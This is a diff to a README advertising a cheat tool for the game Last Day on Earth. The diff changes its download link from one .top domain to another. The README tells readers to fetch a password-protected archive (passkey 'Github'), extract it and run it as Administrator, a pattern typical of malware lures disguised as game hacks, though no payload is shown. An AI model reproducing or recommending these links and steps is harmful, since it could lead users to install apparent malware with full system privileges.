@@ -6,7 +6,7 @@ Last Day on Earth hack with noclip, speedhack, startpos switcher, hitbox viewer,
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **community tools**, **overlay menu**, and **helper m
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Last Day on Earth.
 4. Run the hack **as Administrator**.
